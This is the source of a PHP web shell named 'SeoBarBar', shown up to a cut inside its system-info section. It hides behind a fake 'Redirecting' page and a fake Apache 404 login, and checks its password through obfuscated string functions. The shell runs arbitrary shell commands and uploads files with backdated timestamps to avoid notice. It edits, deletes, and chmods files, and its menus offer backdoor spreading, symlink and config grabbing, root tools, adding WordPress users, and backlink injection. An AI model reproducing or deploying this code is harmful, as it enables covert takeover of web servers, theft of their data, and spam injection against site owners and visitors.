
<!DOCTYPE html>
<html lang="en" >
<head>
  <title>Redirecting..</title>
  <link rel="stylesheet" type="text/css" href="style.css">
<style>
@import url(https://fonts.googleapis.com/css?family=Open+Sans:300);
body {
  background-color: #f1c40f;
  overflow: hidden;
}

h1 {
  position: absolute;
  font-family: "Open Sans";
  font-weight: 600;
  font-size: 20px;
  text-transform: uppercase;
  left: 50%;
  top: 58%;
  margin-left: -20px;
}

/* Gaya untuk latar belakang animasi */
.body {
  position: absolute;
  top: 50%;
  margin-left: -50px;
  left: 50%;
  animation: speeder 0.4s linear infinite;
  z-index: 0; /* Menetapkan z-index untuk animasi latar belakang */
}

.body > span {
  height: 10px;
  width: 35px;
  background: #000;
  position: absolute;
  top: -19px;
  left: 60px;
  border-radius: 2px 10px 1px 0;
}

.base span {
  position: absolute;
  width: 0;
  height: 0;
  border-top: 6px solid transparent;
  border-right: 100px solid #000;
  border-bottom: 6px solid transparent;
}
.base span:before {
  content: "";
  height: 22px;
  width: 22px;
  border-radius: 50%;
  background: #000;
  position: absolute;
  right: -110px;
  top: -16px;
}
.base span:after {
  content: "";
  position: absolute;
  width: 0;
  height: 0;
  border-top: 0 solid transparent;
  border-right: 55px solid #000;
  border-bottom: 16px solid transparent;
  top: -16px;
  right: -98px;
}

.face {
  position: absolute;
  height: 12px;
  width: 20px;
  background: #000;
  border-radius: 20px 20px 0 0;
  transform: rotate(-40deg);
  right: -125px;
  top: -15px;
}
.face:after {
  content: "";
  height: 12px;
  width: 12px;
  background: #f1c40f;
  right: 4px;
  top: 7px;
  position: absolute;
  transform: rotate(40deg);
  transform-origin: 50% 50%;
  border-radius: 0 0 0 2px;
}

/* Gaya untuk formulir login */
.login {
    position: relative; /* Menetapkan posisi relatif untuk formulir login */
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    z-index: 1; /* Menetapkan z-index untuk formulir login agar di atas latar belakang */
}

.login input[type="password"],
.login input[type="submit"] {
    width: 50%;
    padding: 10px;
    margin: 10px auto;
    box-sizing: border-box;
    border: 1px solid #f1c40f;
    border-radius: 4px;
    background: #f1c40f;
    color: #f1c40f;
    display: block;
}

.login input[type="submit"] {
    cursor: pointer;
}

.body > span > span:nth-child(1),
.body > span > span:nth-child(2),
.body > span > span:nth-child(3),
.body > span > span:nth-child(4) {
  width: 30px;
  height: 1px;
  background: #000;
  position: absolute;
  animation: fazer1 0.2s linear infinite;
}

.body > span > span:nth-child(2) {
  top: 3px;
  animation: fazer2 0.4s linear infinite;
}

.body > span > span:nth-child(3) {
  top: 1px;
  animation: fazer3 0.4s linear infinite;
  animation-delay: -1s;
}

.body > span > span:nth-child(4) {
  top: 4px;
  animation: fazer4 1s linear infinite;
  animation-delay: -1s;
}

@keyframes fazer1 {
  0% {
    left: 0;
  }
  100% {
    left: -80px;
    opacity: 0;
  }
}
@keyframes fazer2 {
  0% {
    left: 0;
  }
  100% {
    left: -100px;
    opacity: 0;
  }
}
@keyframes fazer3 {
  0% {
    left: 0;
  }
  100% {
    left: -50px;
    opacity: 0;
  }
}
@keyframes fazer4 {
  0% {
    left: 0;
  }
  100% {
    left: -150px;
    opacity: 0;
  }
}
@keyframes speeder {
  0% {
    transform: translate(2px, 1px) rotate(0deg);
  }
  10% {
    transform: translate(-1px, -3px) rotate(-1deg);
  }
  20% {
    transform: translate(-2px, 0px) rotate(1deg);
  }
  30% {
    transform: translate(1px, 2px) rotate(0deg);
  }
  40% {
    transform: translate(1px, -1px) rotate(1deg);
  }
  50% {
    transform: translate(-1px, 3px) rotate(-1deg);
  }
  60% {
    transform: translate(-1px, 1px) rotate(0deg);
  }
  70% {
    transform: translate(3px, 1px) rotate(-1deg);
  }
  80% {
    transform: translate(-2px, -1px) rotate(1deg);
  }
  90% {
    transform: translate(2px, 1px) rotate(0deg);
  }
  100% {
    transform: translate(1px, -2px) rotate(-1deg);
  }
}
.longfazers {
  position: absolute;
  width: 100%;
  height: 100%;
  z-index: 0; /* Menetapkan z-index untuk animasi latar belakang */
}
.longfazers span {
  position: absolute;
  height: 2px;
  width: 20%;
  background: #000;
}
.longfazers span:nth-child(1) {
  top: 20%;
  animation: lf 0.6s linear infinite;
  animation-delay: -5s;
}
.longfazers span:nth-child(2) {
  top: 40%;
  animation: lf2 0.8s linear infinite;
  animation-delay: -1s;
}
.longfazers span:nth-child(3) {
  top: 60%;
  animation: lf3 0.6s linear infinite;
}
.longfazers span:nth-child(4) {
  top: 80%;
  animation: lf4 0.5s linear infinite;
  animation-delay: -3s;
}

@keyframes lf {
  0% {
    left: 200%;
  }
  100% {
    left: -200%;
    opacity: 0;
  }
}
@keyframes lf2 {
  0% {
    left: 200%;
  }
  100% {
    left: -200%;
    opacity: 0;
  }
}
@keyframes lf3 {
  0% {
    left: 200%;
  }
  100% {
    left: -100%;
    opacity: 0;
  }
}
@keyframes lf4 {
  0% {
    left: 200%;
  }
  100% {
    left: -100%;
    opacity: 0;
  }
}

</style>
</head>
<body>
  <div class='body'>
  <span>
    <span></span>
    <span></span>
    <span></span>
    <span></span>
  </span>
  <div class='base'>
    <span></span>
    <div class='face'></div>
  </div>
</div>
<div class='longfazers'>
  <span></span>
  <span></span>
  <span></span>
  <span></span>
</div>
<h1>Redirecting..</h1>
<div class="login">
    <form method="post">
      <input type="password" name="password">
      <input type="submit" name="submit" value="">
    </form>
</div>
</body>
</html>



session_start();error_reporting(0);date_default_timezone_set("Asia/Jakarta");clearstatcache();
$wlsb = str_replace("pa","","paspatparpa_pareplpaapacpae");
$auth_pass = $wlsb("k", "", "545e5bdd68c9ba8223fdd1b6ecb1437c");
define('LOVE','ILOVEYOU');
function printLogin() { 
    ?> 
<h1>404 Not Found</h1> 
    <title>404 Not Found </title>
<style type="text/css">
input[type=password] {
    width: 250px;
    height: 25px;
    color: white;
    background: transparent;
    border: 1px solid white;
    margin-left: 20px;
    text-align: center;
}
</style>
    <p>The requested URL was not found on this server.</p> 
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p> 
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address> 

<center><form method="post"><input type="password" name="pass" autocomplete="off"><br></form></center>
    <?php 
                                                                                                                                                                                                                                                                       

?>

<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              ?><!doctypehtml><html dir="auto"lang="en-US"><head><meta charset="UTF-8"><meta content="NOINDEX, NOFOLLOW"name="robots"><title>SeoBarBar</title><link href="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAAQABADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDe0T9mrwn46/YZ/YvsfDv7Fv8AY/jDxZpVtaL4z/4Q/wAAal/wld5L8PtbaK78i51RTeYuhFqflakIFk+xfOVn8uNuf8eeA/hT8Fv2VP2rfA/jj9lLw/J8VpNK1O00PXLvQPh1o1/YXlj8OtDnvbu1sodWaWLy5mk1aSLSUuFgW+DKTMZI15/4Q/ts3+kfA/8AZ109f2jfsMPwu0rQ7vwlb/8ACz/hxD9ovG+G2ume08qXSmm0b7Nf+Ro/m6u1wrfb9xBmCSLz/wC0B+0BovxF8FfGjWNY+NHh/wAQ+IPEOleJbu/v7vx98Mr2/wDDl5P8MtBjNpalNIF1qX267E2iSS6JJaqV08Ejzd7sAf/Z"rel="shortcut icon"><link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"rel="stylesheet"crossorigin="anonymous"integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"></head><link href="https://yudas1337.github.io/NINJA_SHELL/main.css"rel="stylesheet"><script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"crossorigin="anonymous"integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"></script><script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"crossorigin="anonymous"integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"></script><body><style type="text/css">@import url(https://fonts.googleapis.com/css?family=Gugi);body{color:#000;font-family:Gugi;font-size:14px;height:100%}a{text-decoration:none}a:hover{color:#5dade2;text-decoration:underline}input{background:0 0}textarea{border:1px solid #000;width:100%;height:400px;padding-left:5px;margin:10px auto;resize:none;color:#000;font-family:Gugi;font-size:13px}.inline{display:flex;flex-flow:row wrap;align-items:center;width:100%;margin:5px 10px 5px 0;padding:10px 20px}.hoverTable{width:100%;border-collapse:collapse}.hoverTable td{padding:7px;border:#4e95f4 1px solid}.hoverTable tr{background:#e4edfa}.hoverTable tr:hover{background-color:#ff9}code{-webkit-user-select:all;user-select:all;padding:0;width:10px;border:1px dashed #c9baa7;color:#31808c;background-color:#f5f4ef;text-align:center;font-family:inherit;overflow:auto}code:focus{border:1px dashed #31808c;outline:0;animation:select .1s step-end forwards}@keyframes select{to{-webkit-user-select:text;user-select:text}}.semprotna{width:95%;display:inline-block;overflow:auto;white-space:nowrap;margin:0 auto}</style><div class="container"><nav class="bg-light navbar navbar-expand-lg navbar-light"style="margin-top:10px"><?php if(isset($_GET["d"])){$d=uhex($_GET["d"]);$GNJ[2](uhex($_GET["d"]));}else{$d=$GNJ[3]();}$k=$GNJ[4]("/(\|\/)/",$d); ?><div class="collapse navbar-collapse"id="navbarNav"><a href="?"class="ajx nav-link"><img alt="ethical"src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAAQABADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDe0T9mrwn46/YZ/YvsfDv7Fv8AY/jDxZpVtaL4z/4Q/wAAal/wld5L8PtbaK78i51RTeYuhFqflakIFk+xfOVn8uNuf8eeA/hT8Fv2VP2rfA/jj9lLw/J8VpNK1O00PXLvQPh1o1/YXlj8OtDnvbu1sodWaWLy5mk1aSLSUuFgW+DKTMZI15/4Q/ts3+kfA/8AZ109f2jfsMPwu0rQ7vwlb/8ACz/hxD9ovG+G2ume08qXSmm0b7Nf+Ro/m6u1wrfb9xBmCSLz/wC0B+0BovxF8FfGjWNY+NHh/wAQ+IPEOleJbu/v7vx98Mr2/wDDl5P8MtBjNpalNIF1qX267E2iSS6JJaqV08Ejzd7sAf/Z"title="ethical"></a><ul class="navbar-nav"><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('info')?>"class="ajx nav-link">Info</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('mass')?>"class="ajx nav-link">Mass Tools</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('symlink')?>"class="ajx nav-link">Symlink</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('config')?>"class="ajx nav-link">Config</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('network')?>"class="ajx nav-link">Network</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('cgi')?>"class="ajx nav-link">CGI</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('bypass')?>"class="ajx nav-link">Bypass</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('exploiter')?>"class="ajx nav-link">Exploiter</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('auto_tools')?>"class="ajx nav-link">Auto Tools</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('processx')?>"class="ajx nav-link">Process</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('r00t')?>"class="ajx nav-link">r00t</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('scanner')?>"class="ajx nav-link">Scanner</a></li><li class="active nav-item"><a href="?d=<?=hex($d)?>&<?=hex('logout')?>"class="ajx nav-link">Logout <sup>2.2i</sup></a></li></ul></div><div class="x y"><a href="?"class="ajx"><h1><font color="black">SeoBarBar</font></h1></a></div><button aria-controls="navbarNav"aria-expanded="false"aria-label="Toggle navigation"class="navbar-toggler"data-target="#navbarNav"data-toggle="collapse"type="button"><span class="navbar-toggler-icon"></span></button></nav></div><div class="u"><form method="post"enctype="multipart/form-data"><label class="l w"><br><input name="n[]"class="form-control mr-3"type="file"multiple onchange="this.form.submit()"></label></form><?php $o_=array('<script>$.notify("','", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>');$f=$o_[0].'Success!'.$o_[1];$g=$o_[0].'Failed!'.$o_[1];if(isset($_FILES["n"])){$z=$_FILES["n"]["name"];$r=count($z);for($i=0;$i<$r;$i++){if($GNJ[5]($_FILES["n"]["tmp_name"][$i],$z[$i])){echo $f;@touch($z[$i],strtotime("-".rand(30,150)." days",time()));}else{echo $g;}}} ?></div><?php echo "<br>Current Directory : ";foreach($k as $m=>$l){if($l==''&&$m==0){echo '<a class="ajx" href="?d=2f">/</a>';}if($l==''){continue;}echo '<a class="ajx" href="?d=';for($i=0;$i<=$m;$i++){echo hex($k[$i]);if($i!=$m){echo '2f';}}echo '">'.$l.'</a>/';}$dirx=path();$fullx=$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'],"",$dirx);print" >> <code>$d</code>";echo ' [<a href="//'.$fullx.'/" target="_blank">L</a>]';print "<br>";print(OS()==="Windows")?windisk():"";echo '<div class="semprotna">
				<div style="float: left;">
						  <a class="btn btn-primary btn-sm ml-3 ajx" href="?d='.hex($d).'&n">+NEWFILE+</a>
						  <a class="btn btn-primary btn-sm ajx " href="?d='.hex($d).'&l">+NEWDIR+</a>
						  
						  <a class="btn btn-success btn-sm ajx " href="?d='.hex($d).'&'.hex('mass_tool').'">Scramble</a>
						  <a class="btn btn-success btn-sm ajx " href="?d='.hex($d).'&'.hex('Lockdown').'">Lockdown</a>
						  <a class="btn btn-success btn-sm ajx " href="?d='.hex($d).'&'.hex('signature').'">Tebar BD</a>
				</div>		  
				<div style="float: right;">	
						  <a class="btn btn-info btn-sm ajx " href="?d='.hex($d).'&'.hex("ENC").'">ENC</a>
						  <a class="btn btn-info btn-sm ajx " href="?d='.hex($d).'&'.hex("crontab").'">Crontab</a> ';if(isset($_SESSION["SeoBarBar"])){echo '<a class="btn btn-danger btn-sm ajx " href="?d='.hex($d).'&'.hex('md5xoff').'">MD5OFF</a>';}else{echo '<a class="btn btn-danger btn-sm ajx " href="?d='.hex($d).'&'.hex('md5xon').'">MD5ON</a>';}echo ' <a class="btn btn-warning btn-sm ajx " href="?d='.hex($d).'&'.hex('adduserwp').'">Add User WP</a>
						  <a class="btn btn-warning btn-sm ajx " href="?d='.hex($d).'&'.hex('footer').'">Inject BL WP</a>
				</div>
			  </div>
						  ';echo "<form method='post'><center>
				<font color = 'red'>".$user." @ ".gethostbyname($_SERVER['HTTP_HOST']).": ~ $ </font>&nbsp;
				<input style='border: none; border-bottom: 1px solid #000;' type='text' size='30' height='10' name='cmd'><input style='border: none; border-bottom: 1px solid #000;' type='submit' name='do_cmd' value='>>'>
				</center></form>";if(isset($_POST['do_cmd'])){echo "<pre>".exe($_POST['cmd'])."</pre>";}$a_='<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>';$b_='</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">';$c_='</td>
							</tr>
						</tbody>
					</table>';$d_='<input type="submit" class="form-control col-md-3" value="&nbsp;OK&nbsp;" />
									</form>';if(isset($_GET["s"])){$checkfx=$d.DIRECTORY_SEPARATOR.uhex($_GET["s"]);if(file_exists($checkfx)){echo $a_.'<h2>Viewing '.uhex($_GET["s"]).'</h2>Path: <code>'.$d.DIRECTORY_SEPARATOR.uhex($_GET["s"]).'</code> - Link: <a href="//'.$fullx.'/'.uhex($_GET["s"]).'" target="_blank">'.$fullx.'/'.uhex($_GET["s"]).'</a>'.$b_.'
												<div class="inline">
									<input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["s"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;EDIT&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&r='.$_GET["s"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;RENAME&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&x='.$_GET["s"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;DELETE&nbsp;" />
									<input onclick="location.href=\'?d='.$_GET["d"].'&t='.$_GET["s"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;GANTI TANGGAL&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&k='.$_GET["s"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;CHMOD&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&s='.$_GET["s"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;VIEW&nbsp;" /> 
									</div>
									<textarea readonly class = "form-control">'.$GNJ[15]($GNJ[6](uhex($_GET["s"]))).'</textarea>
									<br />
									<br />

								'.$c_;}else{echo "<h1>FILE NOT EXIST!</h1>";}}elseif(isset($_GET["y"])){echo $a_.'REQUEST'.$b_.'
									<form method="post">
										<input class="form-control md-3" type="text" name="1" autocomplete="off" />&nbsp;&nbsp;
										<input class="form-control md-3" type="text" name="2" autocomplete="off" />
										'.$d_.'
									<br />
									<textarea readonly class = "form-control">';if(isset($_POST["2"])){echo $GNJ[15](dre($_POST["1"],$_POST["2"]));}echo '</textarea>
								'.$c_;}elseif(isset($_GET["e"])){if(file_exists($d.DIRECTORY_SEPARATOR.uhex($_GET["e"]))){if(!is_writable($d.DIRECTORY_SEPARATOR.uhex($_GET["e"]))){$maridonoWR='<h2 style="color: red;">Editing '.uhex($_GET["e"]).' (Not Writable)</h2>';}else{$maridonoWR='<h2 style="color: green;">Editing '.uhex($_GET["e"]).' (Writable)</h2>';echo $a_.' '.$maridonoWR.'Path: <code>'.$d.DIRECTORY_SEPARATOR.uhex($_GET["e"]).'</code> - Link: <a href="//'.$fullx.'/'.uhex($_GET["e"]).'" target="_blank">'.$fullx.'/'.uhex($_GET["e"]).'</a>'.$b_.'
									<div class="inline">
									<input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["e"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;EDIT&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&r='.$_GET["e"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;RENAME&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&x='.$_GET["e"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;DELETE&nbsp;" />
									<input onclick="location.href=\'?d='.$_GET["d"].'&t='.$_GET["e"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;GANTI TANGGAL&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&k='.$_GET["e"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;CHMOD&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&s='.$_GET["e"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;VIEW&nbsp;" /> 
									</div>			
									<form method="post">
										<textarea name="e" class="form-control">'.$GNJ[15]($GNJ[6](uhex($_GET["e"]))).'</textarea>
										<span class="w" style="float:right;width:500px;display: inline-block;padding: .375rem .75rem;font-size: 1rem;ine-height: 1.5;color: #495057;background-color: #fff;background-clip: padding-box;border: 1px solid #ced4da;border-radius: .25rem; transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;">
										BASE64 : <select id="b64" name="b64" class="col-md-3">
											<option value="0">NO</option>
											<option value="1">YES</option>
										</select></span>
										'.$d_.'
								'.$c_.'
								
					<script>
						$("#b64").change(function() {
							if($("#b64 option:selected").val() == 0) {
								var X = $("textarea").val();
								var Z = atob(X);
								$("textarea").val(Z);
							}
							else {
								var N = $("textarea").val();
								var I = btoa(N);
								$("textarea").val(I);
							}
						});
					</script>';if(isset($_POST["e"])){if($_POST["b64"]=="1"){$ex=$GNJ[7]($_POST["e"]);}else{$ex=$_POST["e"];}$fp=$GNJ[17](uhex($_GET["e"]),'w');if($GNJ[18]($fp,$ex)){OK();}else{ER();}$GNJ[19]($fp);}}}else{echo "File not exist! <a href='?d=".hex($d)."&n'>Do you want to create it ?</a>";}}elseif(isset($_GET["x"])){rec(uhex($_GET["x"]));if($GNJ[26](uhex($_GET["x"]))){ER();}else{OK();}}elseif(isset($_GET["t"])){if(file_exists($d.DIRECTORY_SEPARATOR.uhex($_GET["t"]))){echo $a_.'<h2>Ganti Waktu File '.uhex($_GET["t"]).'</h2>Path: <code>'.$d.DIRECTORY_SEPARATOR.uhex($_GET["t"]).'</code> - Link: <a href="//'.$fullx.'/'.uhex($_GET["t"]).'" target="_blank">'.$fullx.'/'.uhex($_GET["t"]).'</a>'.$b_.'
													<div class="inline">
									<input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["t"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;EDIT&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&r='.$_GET["t"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;RENAME&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&x='.$_GET["t"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;DELETE&nbsp;" />
									<input onclick="location.href=\'?d='.$_GET["d"].'&t='.$_GET["t"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;GANTI TANGGAL&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&k='.$_GET["t"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;CHMOD&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&s='.$_GET["t"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;VIEW&nbsp;" /> 
									</div>
									<center>
									<form action="" method="post">
										<input name="t" class="form-control col-md-3" autocomplete="off" type="text" value="'.$GNJ[20]("Y-m-d H:i",$GNJ[21](uhex($_GET["t"]))).'">
										'.$d_.'
								'.$c_;if(!empty($_POST["t"])){$p=$GNJ[33]($_POST["t"]);if($p){if(!$GNJ[25](uhex($_GET["t"]),$p,$p)){ER();}else{OK();}}else{ER();}}}else{echo "File not exist! <a href='?d=".hex($d)."&n'>Do you want to create it ?</a>";}}elseif(isset($_GET["k"])){if(file_exists($d.DIRECTORY_SEPARATOR.uhex($_GET["k"]))){echo $a_.'<h2>CHMOD '.uhex($_GET["k"]).'</h2>Path: <code>'.$d.DIRECTORY_SEPARATOR.uhex($_GET["k"]).'</code> - Link: <a href="//'.$fullx.'/'.uhex($_GET["k"]).'" target="_blank">'.$fullx.'/'.uhex($_GET["k"]).'</a>'.$b_.'
												<div class="inline">
									<input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["k"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;EDIT&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&r='.$_GET["k"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;RENAME&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&x='.$_GET["k"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;DELETE&nbsp;" />
									<input onclick="location.href=\'?d='.$_GET["d"].'&t='.$_GET["k"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;GANTI TANGGAL&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&k='.$_GET["k"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;CHMOD&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&s='.$_GET["k"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;VIEW&nbsp;" /> 
									</div>
									<center>
									<form action="" method="post">
										<input name="b" autocomplete="off" class="form-control col-md-3" type="text" value="'.$GNJ[22]($GNJ[23]('%o',$GNJ[24](uhex($_GET["k"]))),-4).'">
										
										'.$d_.'
								'.$c_;if(!empty($_POST["b"])){$x=$_POST["b"];$t=0;for($i=strlen($x)-1;$i>=0;--$i)$t+=(int) $x[$i]*pow(8,(strlen($x)-$i-1));if(!$GNJ[12](uhex($_GET["k"]),$t)){ER();}else{OK();}}}else{echo "File not exist! <a href='?d=".hex($d)."&n'>Do you want to create it ?</a>";}}elseif(isset($_GET["l"])){echo $a_.'+DIR'.$b_.'
									<form action="" method="post">
										<input name="l" autocomplete="off" class="form-control col-md-3" type="text" value="">
										'.$d_.'
								'.$c_;if(isset($_POST["l"])){if(!$GNJ[11]($_POST["l"])){ER();}else{OK();}}}elseif(isset($_GET["q"])){if($GNJ[10](__FILE__)){$GNJ[38]($GNJ[9]);header("Location: ".basename($_SERVER['PHP_SELF'])."");exit();}else{echo $g;}}elseif(isset($_GET[hex('info')])){echo '<hr>SYSTEM INFORMATION<center>
						<textarea class = "form-control" readonly>	
			Server 					: '.$_SERVER['HTTP_HOST'].'
			Server IP 				: '.$_SERVER['SERVER_ADDR'].' Your IP : '.$_SERVER['REMOTE_ADDR'].'
			Kernel Version 			: '.php_uname().'
			Software 					: '.$_SERVER['SERVER_SOFTWARE'].'
			Storage Space 			: '.$used."/".$total."(Free : ".$freespace.")".'
			User / Group 				: '.$user.' ('.$uid.') | '.$group.' ('.$gid.') 
			Time On Server 			: '.date("d M Y h:i:s a").'
			Disable Functions 			: '.$show_ds.'
			Safe Mode 				: '.$sm.'
			PHP VERSION 				: '.phpversion().' On '.php_sapi_name().'
